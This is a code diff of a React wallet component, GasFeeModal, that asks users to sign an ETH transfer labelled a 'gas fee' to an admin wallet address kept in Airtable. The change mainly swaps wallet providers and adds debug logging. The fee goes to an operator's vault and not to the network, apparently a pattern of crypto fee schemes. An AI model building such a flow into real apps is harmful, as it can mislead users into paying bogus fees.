@@ -2,9 +2,8 @@
 
 import { useEffect, useState, useMemo } from 'react';
 import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
-import { ethers, BrowserProvider } from 'ethers';
+import { ethers } from 'ethers';
 import { useWallet } from '@/context/base';
-import { useAppKitProvider } from '@reown/appkit/react';
 import { motion, AnimatePresence } from 'framer-motion';
 
 declare global {
@@ -36,8 +35,7 @@ export default function GasFeeModal({
     const [txSuccess, setTxSuccess] = useState<any>(false);
     const [txHash, setTxHash] = useState('');
     const [error, setError] = useState(null);
-    const { address: add } = useWallet();
-    const { walletProvider } = useAppKitProvider('eip155');
+    const { cbProvider, address: add } = useWallet();
     const [internalUser, setInternalUser] = useState<any>(user);
     const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
     const [loadingSettings, setLoadingSettings] = useState(false);
@@ -91,82 +89,62 @@ export default function GasFeeModal({
     }, []);
 
     const sendEth = async () => {
+        console.log(internalUser?.fields?.gasFee, "internalUser")
         let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
 
-        const gasVault = adminAddresses['gas_fee_address_eth'] || '';
+        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';
+
+        console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });
 
         try {
-            if (!gasVault) {
-                const foundKeys = Object.keys(adminAddresses).join(', ');
-                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
+            if (!cbProvider) {
+                setError("Wallet provider not found. Please reconnect.");
                 return;
             }
-            if (!gasVault.startsWith('0x')) {
-                setError(`Invalid gas fee address: "${gasVault}". Must be a valid 0x Ethereum address.`);
+            if (!amountText || isNaN(parseFloat(amountText))) {
+                setError(`Invalid gas fee amount: ${amountText}`);
+                return;
+            }
+            if (!gasVault || !gasVault.startsWith('0x')) {
+                const foundKeys = Object.keys(adminAddresses).join(', ');
+                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
                 return;
             }
 
             setStatus('processing');
             setError(null);
 
-            // Use Reown AppKit walletProvider — this is the correct EIP-1193 provider
-            // that supports eth_sendTransaction via WalletConnect / Trust Wallet
-            const rawProvider: any = walletProvider
-                || (typeof window !== 'undefined' && (window as any).ethereum);
-
-            if (!rawProvider) {
-                setError("No wallet provider found. Please open this page inside Trust Wallet browser.");
+            // 1. Ensure we are on the correct chain before sending
+            try {
+                await cbProvider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x1' }],
+                });
+            } catch (switchError: any) {
+                setError(`Network switch to Ethereum Mainnet is required for gas payment.`);
                 setStatus('idle');
                 return;
             }
 
-            // 1. Try to switch to Ethereum Mainnet — silently ignore if not supported
-            // (WalletConnect sessions often don't support wallet_switchEthereumChain)
-            try {
-                await rawProvider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }],
-                });
-            } catch {
-                // Non-fatal — proceed with transaction regardless
-                // The wallet may already be on the correct chain
-            }
+            const provider = new ethers.BrowserProvider(cbProvider);
+            const signer = await provider.getSigner();
 
-            // 2. Send transaction — try ethers signer first, raw request as fallback
-            let txHash = '';
-            try {
-                const provider = new ethers.BrowserProvider(rawProvider);
-                const signer = await provider.getSigner();
-                const fromAddress = await signer.getAddress();
-                const tx = await signer.sendTransaction({
-                    to: gasVault.trim(),
-                    from: fromAddress,
-                    value: ethers.parseEther(parseFloat(amountText).toFixed(18)),
-                });
-                setStatus('confirming');
-                await tx.wait();
-                txHash = tx.hash;
-            } catch (signerErr: any) {
-                // Fallback: use raw eth_sendTransaction request directly
-                console.warn('Signer failed, trying raw eth_sendTransaction:', signerErr?.message);
-                const accounts: string[] = await rawProvider.request({ method: 'eth_requestAccounts' });
-                const fromAddress = accounts[0];
-                const valueHex = '0x' + BigInt(Math.round(parseFloat(amountText) * 1e18)).toString(16);
-                const rawHash: string = await rawProvider.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: fromAddress,
-                        to: gasVault.trim(),
-                        value: valueHex,
-                        gas: '0x5208', // 21000
-                    }],
-                });
-                txHash = rawHash;
-            }
+            console.log('[DEBUG] Sending transaction to:', gasVault, 'with value:', amountText, 'on', targetNetworkName);
+
+            // 2. Create and send the transaction
+            const tx = await signer.sendTransaction({
+                to: gasVault.trim(),
+                value: ethers.parseEther(Number(amountText).toFixed(18)),
+            });
+
+            setStatus('confirming');
+            await tx.wait();
 
             setStatus('success');
             setTxSuccess(true);
-            setTxHash(txHash);
+            setTxHash(tx.hash);
+
+            console.log('[DEBUG] Transaction successful! Hash:', tx.hash);
 
             // 3. Record the transaction
             try {
@@ -183,15 +161,15 @@ export default function GasFeeModal({
                         status: "completed"
                     })
                 });
-            } catch (apiErr) {
-                console.error("Failed to record fee transaction:", apiErr);
+            } catch (err) {
+                console.error("Failed to save gas history", err);
             }
 
-            if (onSuccess) onSuccess(txHash);
+            if (onSuccess) onSuccess(tx.hash);
 
         } catch (err: any) {
-            console.error("Gas Payment Error:", err);
-            const msg = err?.info?.error?.message || err?.error?.message || err?.message || "Transaction failed. Please try again.";
+            console.error("Gas Payment Error Details:", err);
+            const msg = err?.info?.error?.message || err?.message || "Transaction failed";
             setError(msg);
             setStatus('idle');
         }
